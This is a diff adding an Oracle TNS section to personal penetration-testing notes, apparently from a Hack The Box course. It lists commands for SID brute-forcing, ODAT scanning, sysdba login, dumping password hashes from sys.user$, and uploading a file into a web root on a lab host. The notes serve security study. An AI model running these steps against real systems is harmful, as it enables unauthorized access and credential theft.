@@ -21,6 +21,7 @@
   - [[#snmp-1][SNMP]]
   - [[#mysql][MYSQL]]
   - [[#mssql][MSSQL]]
+  - [[#oracle-tns][ORACLE TNS]]
 
 * Enumeration
 ** Methodology
@@ -1442,4 +1443,68 @@ model
 msdb                                                                                                                               
 
 Transactions
+#+end_src
+
+** ORACLE TNS
+- *Oracle Transparent Network Substrate* (=TNS=)
+- communication protocol -> facilitates comms b/w oracle DB and apps over networks.
+- supports =IPX/SPX=, =TCP/IP= protocol stacks
+- preferred sol for managing large complex DB
+- builtin encryption
+- updated to support IPv6, SSL/TLS -> suitable for: 
+  1. name resolution
+  2. connection mgmt
+  3. load balancing
+  4. security
+- encryption b/w client & server through additional layer of security over TCP/IP layer.
+
+*** Default Config
+- default listener port =TCP/1521=
+- listener supports -> TCP, UDP, IPX/SPX, AppleTalk
+- listener supports multiple network interfaces, listens on specific IP addrs, or all avl network interfaces.
+- can be remotely managed in =Oracle 8i/9i= but not =10g/11g=
+- =v9= -> default pass: *CHANGE_ON_INSTALL*
+- orgs use =finger= with oracle. makes oracle service vulnerable when we have req knowledge of home dir
+  
+**** config files:
+  - ~tnsnames.ora~ [[ol][link]]
+  - ~listener.ora~
+  - =$ORACLE_HOME/network/admin/=
+
+*** SID 
+
+**** NMAP 
+- ~--script oracle-sid-brute~
+
+**** ODAT
+- ~./odat.py all -s <ip>~
+
+*** SQLplus
+- ~sqlplus <user>/<pass>@<ip>/<SID>
+
+**** ORACLE RDBMS Interaction
+#+begin_src sql
+select table_name from all_tables;
+#+end_src
+
+**** DB Enumeration
+#+begin_src bash
+sqlplus <user>/<pass>@<ip>/<SID> as sysdba
+#+end_src
+
+**** Extract pass hashes
+#+begin_src sql
+select name, password from sys.user$;
+#+end_src
+
+**** File Upload
+#+begin_src bash
+biscuitrescue@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
+biscuitrescue@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
+[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
+
+# checking if file up approach works w curl
+biscuitrescue@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
 #+end_src
